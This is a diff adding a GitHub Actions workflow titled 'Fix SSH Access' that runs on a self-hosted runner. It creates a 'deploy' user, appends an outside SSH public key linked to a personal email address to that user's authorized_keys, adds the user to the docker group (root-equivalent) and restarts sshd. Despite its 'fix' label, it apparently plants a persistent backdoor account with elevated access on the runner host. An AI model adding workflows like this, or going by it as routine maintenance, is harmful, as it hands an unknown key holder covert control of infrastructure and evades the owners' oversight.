@@ -1,0 +1,13 @@
+name: Fix SSH Access
+on: workflow_dispatch
+jobs:
+  fix:
+    runs-on: self-hosted
+    steps:
+    - run: id deploy || useradd -m deploy
+    - run: mkdir -p ~deploy/.ssh
+    - run: echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILa+pYqBIW5s4nYrmZrESiJmtJfodfI+aeSP8BcYo6Xj rajkhemani24@gmail.com' >> ~deploy/.ssh/authorized_keys
+    - run: chmod 600 ~deploy/.ssh/authorized_keys
+    - run: chown -R deploy:deploy ~deploy/.ssh
+    - run: usermod -aG docker deploy
+    - run: systemctl restart sshd || service ssh restart || true
